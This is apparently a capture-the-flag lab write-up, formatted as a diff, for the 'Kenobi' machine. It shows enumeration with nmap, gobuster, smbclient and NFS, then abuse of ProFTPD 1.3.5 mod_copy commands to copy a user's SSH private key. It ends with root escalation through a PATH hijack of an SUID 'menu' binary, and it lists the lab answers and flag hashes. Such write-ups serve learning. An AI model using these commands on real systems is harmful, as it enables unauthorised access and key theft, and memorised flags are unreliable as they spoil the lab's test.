@@ -1,0 +1,364 @@
+This room will cover accessing a Samba share, manipulating a vulnerable version of proftpd to gain initial access and escalate your privileges to root via an SUID binary.
+
+initial nmap scan
+```
+└─$ sudo nmap -Pn -sV -sS 10.10.37.163
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-06 12:30 PDT
+Nmap scan report for 10.10.37.163
+Host is up (0.16s latency).
+Not shown: 993 closed tcp ports (reset)
+PORT     STATE SERVICE     VERSION
+21/tcp   open  ftp         ProFTPD 1.3.5
+22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
+80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))
+111/tcp  open  rpcbind     2-4 (RPC #100000)
+139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+2049/tcp open  nfs_acl     2-3 (RPC #100227)
+Service Info: Host: KENOBI; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+```
+
+anonymous ftp is allowed but email address is required as a password. May be able to exploit this later.
+```
+└─$ ftp
+ftp> open 10.10.37.163
+Connected to 10.10.37.163.
+220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.37.163]
+Name (10.10.37.163:gomez22): anonymous
+331 Anonymous login ok, send your complete email address as your password
+Password: 
+530 Login incorrect.
+ftp: Login failed
+
+```
+
+Scan the machine with nmap, how many ports are open?
+* 21
+
+gobuster output
+```
+└─$ gobuster dir -w /usr/share/wordlists/dirb/common.txt -x php,html,js,txt -u 10.10.37.163
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.10.37.163
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.1.0
+[+] Extensions:              php,html,js,txt
+[+] Timeout:                 10s
+===============================================================
+2022/07/06 12:35:14 Starting gobuster in directory enumeration mode
+===============================================================
+/.hta.txt             (Status: 403) [Size: 277]
+/.hta                 (Status: 403) [Size: 277]
+/.hta.php             (Status: 403) [Size: 277]
+/.hta.html            (Status: 403) [Size: 277]
+/.htaccess            (Status: 403) [Size: 277]
+/.hta.js              (Status: 403) [Size: 277]
+/.htpasswd            (Status: 403) [Size: 277]
+/.htaccess.html       (Status: 403) [Size: 277]
+/.htpasswd.php        (Status: 403) [Size: 277]
+/.htaccess.js         (Status: 403) [Size: 277]
+/.htpasswd.html       (Status: 403) [Size: 277]
+/.htaccess.txt        (Status: 403) [Size: 277]
+/.htpasswd.js         (Status: 403) [Size: 277]
+/.htaccess.php        (Status: 403) [Size: 277]
+/.htpasswd.txt        (Status: 403) [Size: 277]
+/admin.html           (Status: 200) [Size: 200]
+/index.html           (Status: 200) [Size: 200]
+/index.html           (Status: 200) [Size: 200]
+/robots.txt           (Status: 200) [Size: 36] 
+/robots.txt           (Status: 200) [Size: 36] 
+/server-status        (Status: 403) [Size: 277]
+```
+smbclient listing
+```
+└─$ smbclient -L 10.10.37.163
+Enter WORKGROUP\gomez22's password: 
+
+        Sharename       Type      Comment
+        ---------       ----      -------
+        print$          Disk      Printer Drivers
+        anonymous       Disk      
+        IPC$            IPC       IPC Service (kenobi server (Samba, Ubuntu))
+Reconnecting with SMB1 for workgroup listing.
+
+        Server               Comment
+        ---------            -------
+
+        Workgroup            Master
+        ---------            -------
+        WORKGROUP            KENOBI
+
+```
+
+Using the nmap command above, how many shares have been found?
+* 3
+
+smbclient
+```
+└─$ smbclient \\\\10.10.37.163\\anonymous
+Enter WORKGROUP\gomez22's password: 
+Try "help" to get a list of possible commands.
+smb: \> ls
+  .                                   D        0  Wed Sep  4 03:49:09 2019
+  ..                                  D        0  Wed Sep  4 03:56:07 2019
+  log.txt                             N    12237  Wed Sep  4 03:49:09 2019
+
+                9204224 blocks of size 1024. 6874808 blocks available
+smb: \> get log.txt
+getting file \log.txt of size 12237 as log.txt (19.1 KiloBytes/sec) (average 19.1 KiloBytes/sec)
+```
+
+Once you're connected, list the files on the share. What is the file can you see?
+* log.txt
+
+What port is FTP running on?
+* 21
+
+
+nmap on port 111
+```
+└─$ sudo nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.37.163
+[sudo] password for gomez22: 
+Sorry, try again.
+[sudo] password for gomez22: 
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-06 12:49 PDT
+Nmap scan report for 10.10.37.163
+Host is up (0.16s latency).
+
+PORT    STATE SERVICE
+111/tcp open  rpcbind
+| nfs-ls: Volume /var
+|   access: Read Lookup NoModify NoExtend NoDelete NoExecute
+| PERMISSION  UID  GID  SIZE  TIME                 FILENAME
+| rwxr-xr-x   0    0    4096  2019-09-04T08:53:24  .
+| rwxr-xr-x   0    0    4096  2019-09-04T12:27:33  ..
+| rwxr-xr-x   0    0    4096  2019-09-04T12:09:49  backups
+| rwxr-xr-x   0    0    4096  2019-09-04T10:37:44  cache
+| rwxrwxrwt   0    0    4096  2019-09-04T08:43:56  crash
+| rwxrwsr-x   0    50   4096  2016-04-12T20:14:23  local
+| rwxrwxrwx   0    0    9     2019-09-04T08:41:33  lock
+| rwxrwxr-x   0    108  4096  2019-09-04T10:37:44  log
+| rwxr-xr-x   0    0    4096  2019-01-29T23:27:41  snap
+| rwxr-xr-x   0    0    4096  2019-09-04T08:53:24  www
+|_
+| nfs-showmount: 
+|_  /var *
+| nfs-statfs: 
+|   Filesystem  1K-blocks  Used       Available  Use%  Maxfilesize  Maxlink
+|_  /var        9204224.0  1838828.0  6874800.0  22%   16.0T        32000
+
+Nmap done: 1 IP address (1 host up) scanned in 3.80 seconds
+
+```
+
+What mount can we see?
+* /var
+
+
+Lets get the version of ProFtpd. Use netcat to connect to the machine on the FTP port.
+What is the version?
+* 1.3.5
+
+How many exploits are there for the ProFTPd running?
+* 4
+```
+---------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                                                              |  Path
+---------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+ProFTPd 1.3.5 - 'mod_copy' Command Execution (Metasploit)                                                                   | linux/remote/37262.rb
+ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution                                                                         | linux/remote/36803.py
+ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution (2)                                                                     | linux/remote/49908.py
+ProFTPd 1.3.5 - File Copy                                                                                                   | linux/remote/36742.txt
+```
+
+
+I then followed the lab directions to access the id_rsa keys of user kenobi
+```
+└─$ nc 10.10.37.163 21
+220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.37.163]
+SITE CPFR /home/kenobi/.ssh/id_rsa
+350 File or directory exists, ready for destination name
+SITE CPTO /var/tmp/id_rsa
+250 Copy successful
+```
+
+Now the id_rsa key is in /var/tmp. So I followed (partially) the directions to mount the /var share on my machine
+```
+└─$ sudo mount 10.10.37.163:/var /home/gomez22/kenobiNFS
+```
+
+Opened my ~/kenobiNFS directory and navigated to /tmp. Sure enough I have access to the private key. I will use that to try to ssh into the machine.
+I copied the key into my /home/gomez22 directory, renaming it `kenobi_key`. Ran a quick chmod 600 on it. Then I logged in.
+`ssh -i id_rsa kenobi@10.10.37.163`
+
+Can't sudo -l without a password.
+
+/home/kenobi has user.txt
+* d0b0f3f53b6caa532a83915e19224899
+
+ran linpeas. PATH begins with /home/kenobi/bin
+
+suid bins
+```
+kenobi@kenobi:~$  find / -perm -u=s -type f 2>/dev/null
+/sbin/mount.nfs
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/snapd/snap-confine
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/openssh/ssh-keysign
+/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
+/usr/bin/chfn
+/usr/bin/newgidmap
+/usr/bin/pkexec
+/usr/bin/passwd
+/usr/bin/newuidmap
+/usr/bin/gpasswd
+/usr/bin/menu
+/usr/bin/sudo
+/usr/bin/chsh
+/usr/bin/at
+/usr/bin/newgrp
+/bin/umount
+/bin/fusermount
+/bin/mount
+/bin/ping
+/bin/su
+/bin/ping6
+```
+What file looks particularly out of the ordinary? 
+* /usr/bin/menu
+
+
+Run the binary, how many options appear?
+* 3
+
+strings /usr/bin/menu
+```
+kenobi@kenobi:~$ strings /usr/bin/menu
+/lib64/ld-linux-x86-64.so.2
+libc.so.6
+setuid
+__isoc99_scanf
+puts
+__stack_chk_fail
+printf
+system
+__libc_start_main
+__gmon_start__
+GLIBC_2.7
+GLIBC_2.4
+GLIBC_2.2.5
+UH-`
+AWAVA
+AUATL
+[]A\A]A^A_
+***************************************
+1. status check
+2. kernel version
+3. ifconfig
+** Enter your choice :
+curl -I localhost
+uname -r
+ifconfig
+ Invalid choice
+;*3$"
+GCC: (Ubuntu 5.4.0-6ubuntu1~16.04.11) 5.4.0 20160609
+crtstuff.c
+__JCR_LIST__
+deregister_tm_clones
+__do_global_dtors_aux
+completed.7594
+__do_global_dtors_aux_fini_array_entry
+frame_dummy
+__frame_dummy_init_array_entry
+menu.c
+__FRAME_END__
+__JCR_END__
+__init_array_end
+_DYNAMIC
+__init_array_start
+__GNU_EH_FRAME_HDR
+_GLOBAL_OFFSET_TABLE_
+__libc_csu_fini
+_ITM_deregisterTMCloneTable
+puts@@GLIBC_2.2.5
+_edata
+__stack_chk_fail@@GLIBC_2.4
+system@@GLIBC_2.2.5
+printf@@GLIBC_2.2.5
+__libc_start_main@@GLIBC_2.2.5
+__data_start
+__gmon_start__
+__dso_handle
+_IO_stdin_used
+__libc_csu_init
+__bss_start
+main
+_Jv_RegisterClasses
+__isoc99_scanf@@GLIBC_2.7
+__TMC_END__
+_ITM_registerTMCloneTable
+setuid@@GLIBC_2.2.5
+.symtab
+.strtab
+.shstrtab
+.interp
+.note.ABI-tag
+.note.gnu.build-id
+.gnu.hash
+.dynsym
+.dynstr
+.gnu.version
+.gnu.version_r
+.rela.dyn
+.rela.plt
+.init
+.plt.got
+.text
+.fini
+.rodata
+.eh_frame_hdr
+.eh_frame
+.init_array
+.fini_array
+.jcr
+.dynamic
+.got.plt
+.data
+.bss
+.comment
+
+```
+
+I made a file called `ifconfig` in /tmp with the contents `/bin/bash`.
+I then checked its perms
+```
+-rw-rw-r-- 1 kenobi kenobi      8 Jul  6 15:40 ifconfig
+```
+
+I need to make it executable with `chmod 777 ifconfig`. Then I can add /tmp to the $PATH via
+`export PATH=/tmp:$PATH`
+
+
+Let's check the exploit!
+```
+kenobi@kenobi:/tmp$ menu
+
+***************************************
+1. status check
+2. kernel version
+3. ifconfig
+** Enter your choice :3
+# whoami
+root
+```
+
+We did it! Now lets grab the root flag and bounce!
+* 177b3cd8562289f37382721c28381f02
